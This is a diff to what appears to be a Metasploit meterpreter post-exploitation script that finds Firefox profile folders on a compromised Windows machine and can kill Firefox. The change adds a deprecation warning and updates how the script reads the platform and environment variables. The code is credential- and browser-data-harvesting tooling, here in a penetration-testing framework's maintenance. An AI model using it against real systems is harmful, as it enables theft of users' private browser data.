@@ -1,3 +1,10 @@
+##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to improve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
 #
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
@@ -247,12 +254,13 @@ end
     kill_frfx = true
   end
 }
-if client.platform =~ /win32|win64/
+if client.platform == 'windows'
   if frfxchk
     user = @client.sys.config.getuid
     if not is_system?
-      usrname = Rex::FileUtils.clean_path(@client.fs.file.expand_path("%USERNAME%"))
-      db_path = @client.fs.file.expand_path("%APPDATA%") + "\\Mozilla\\Firefox\\Profiles"
+      envs = @client.sys.config.getenvs('USERNAME', 'APPDATA')
+      usrname = envs['USERNAME']
+      db_path = envs['APPDATA'] + "\\Mozilla\\Firefox\\Profiles"
       if kill_frfx
         kill_firefox
       end
